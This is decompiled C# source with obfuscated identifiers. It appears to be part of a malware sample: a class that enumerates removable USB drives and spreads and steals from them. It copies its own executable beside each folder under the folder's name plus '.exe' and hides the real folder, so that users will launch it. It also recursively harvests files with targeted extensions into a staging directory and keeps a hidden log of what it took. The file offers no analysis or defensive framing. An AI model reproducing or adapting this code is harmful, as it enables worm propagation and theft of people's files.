using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;

namespace uwcrisew;

internal class marparswUSBP
{
	public List<string> marparswfExts = new List<string>();

	public bool marparswthr_runing = false;

	public string marparswfilePath = Application.get_ExecutablePath();

	public bool marparswIsAccessible(string folder)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(folder);
		try
		{
			directoryInfo.GetDirectories();
			if (marparswSETPS.marparswnFilders.Contains(folder.Substring(3).ToLower()))
			{
				return false;
			}
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public void marparswget_drives()
	{
		try
		{
			marparswfExts.Clear();
			marparswthr_runing = true;
			string[] array = marparswSETPS.marparswfilexts.Split(new char[1] { '>' });
			string[] array2 = array;
			foreach (string text in array2)
			{
				if (text != "")
				{
					marparswfExts.Add(text);
				}
			}
			DriveInfo[] drives = DriveInfo.GetDrives();
			DriveInfo[] array3 = drives;
			foreach (DriveInfo driveInfo in array3)
			{
				if (driveInfo.IsReady && driveInfo.DriveType == DriveType.Removable)
				{
					marparswbFilders(driveInfo.Name);
					marparswsent_files(driveInfo.Name);
				}
			}
			marparswthr_runing = false;
		}
		catch
		{
			marparswthr_runing = false;
		}
	}

	public IEnumerable<string> marparswgetFiles(string path)
	{
		Queue<string> queue = new Queue<string>();
		queue.Enqueue(path);
		while (queue.Count > 0)
		{
			path = queue.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (marparswIsAccessible(text))
					{
						queue.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = null;
			try
			{
				files = Directory.GetFiles(path);
			}
			catch
			{
			}
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public void marparswbFilders(string path)
	{
		string[] directories = Directory.GetDirectories(path);
		string[] array = directories;
		foreach (string text in array)
		{
			string text2 = text + ".exe|marparsw".Split(new char[1] { '|' })[0];
			if (!text.Contains(marparswSETPS.marparswusbfold) && !text.Contains("System Volume Information|marparsw".Split(new char[1] { '|' })[0]) && !File.Exists(text2))
			{
				try
				{
					File.Copy(marparswfilePath, text2, overwrite: true);
					DirectoryInfo directoryInfo = new DirectoryInfo(text);
					directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
				}
				catch
				{
				}
			}
		}
	}

	public bool marparswwriteFile(string line)
	{
		try
		{
			TextWriter textWriter = new StreamWriter(marparswSETPS.marparswget_upath() + marparswSETPS.marparswfileusb, append: true);
			textWriter.WriteLine(line);
			textWriter.Close();
			File.SetAttributes(marparswSETPS.marparswget_upath() + marparswSETPS.marparswfileusb, FileAttributes.Hidden);
			return true;
		}
		catch
		{
			return false;
		}
	}

	public bool marparswfindFile(string line)
	{
		try
		{
			if (File.Exists(marparswSETPS.marparswget_upath() + marparswSETPS.marparswfileusb))
			{
				string[] array = File.ReadAllLines(marparswSETPS.marparswget_upath() + marparswSETPS.marparswfileusb);
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (line.ToLower() == text.ToLower())
					{
						return true;
					}
				}
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	public void marparswsent_files(string path)
	{
		try
		{
			if (!Directory.Exists(marparswSETPS.marparswget_upath() + marparswSETPS.marparswusbdate))
			{
				Directory.CreateDirectory(marparswSETPS.marparswget_upath() + marparswSETPS.marparswusbdate);
			}
			foreach (string item in marparswgetFiles(path))
			{
				int num = item.LastIndexOf(".");
				if (num < 0)
				{
					num = 0;
				}
				string text = item.Substring(num);
				if (!marparswfExts.Contains(text.ToLower()) || marparswfindFile(item))
				{
					continue;
				}
				if (item.Contains(marparswSETPS.marparswusbfold))
				{
					string text2 = marparswSETPS.marparswget_upath() + marparswSETPS.marparswusbdate + marparswSETPS.marparswusbfold + "\\";
					if (!Directory.Exists(text2))
					{
						Directory.CreateDirectory(text2);
					}
					File.Copy(item, marparswSETPS.marparswuni_file(text2 + Path.GetFileName(item), File.ReadAllBytes(item).Length), overwrite: true);
				}
				else
				{
					File.Copy(item, marparswSETPS.marparswuni_file(marparswSETPS.marparswget_upath() + marparswSETPS.marparswusbdate + Path.GetFileName(item), File.ReadAllBytes(item).Length), overwrite: true);
				}
				marparswwriteFile(item);
			}
		}
		catch
		{
		}
	}
}
